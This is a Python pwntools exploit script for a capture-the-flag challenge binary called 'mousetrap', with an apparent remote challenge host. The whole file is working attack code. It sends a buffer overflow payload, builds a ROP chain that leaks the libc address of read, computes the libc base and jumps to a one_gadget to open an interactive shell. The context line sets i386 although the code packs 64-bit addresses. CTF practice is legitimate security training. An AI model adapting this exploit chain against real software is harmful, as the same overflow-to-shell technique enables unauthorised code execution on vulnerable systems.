from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./mousetrap"
HOST = "cha.hackpack.club"
PORT = 41719 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
rdi_ret = 0x400923
plt_puts = elf.plt["puts"]
got_puts = elf.got["puts"]
got_read = elf.got["read"]
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
libc = ELF('./libc.so')
off_read = libc.symbols["read"]

gadget = [0x4f2c5, 0x4f322, 0x10a38c]

def exploit():
	# loop1
	payload = "A"*(0x20-0x8)
	payload += p64(0x200)
	conn.sendafter("Name: ", payload)	
	
	payload = "\x00"*(0x120+8)
	#payload += p64(rdi_ret)
	#payload += p64(got_puts)
	#payload += p64(plt_puts)
	payload += p64(rdi_ret)
	payload += p64(got_read)
	payload += p64(plt_puts)
	payload += p64(addr_main)
	conn.sendlineafter(": ", payload)	
	conn.recvuntil("died!")
	
	#libc_puts = u64(conn.recv(6)+"\x00\x00")
	#conn.recvline()
	#print hex(libc_puts)
	libc_read = u64(conn.recv(6)+"\x00\x00")
	libc_base = libc_read - off_read
	one_gadget = libc_base + gadget[0]
	print hex(libc_base)
	
	payload = "A"*(0x20-0x8)
	payload += p64(0x200)
	conn.sendafter("Name: ", payload)	
	
	payload = "\x00"*(0x120+8)
	payload += p64(one_gadget)
	conn.sendlineafter(": ", payload)	
	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
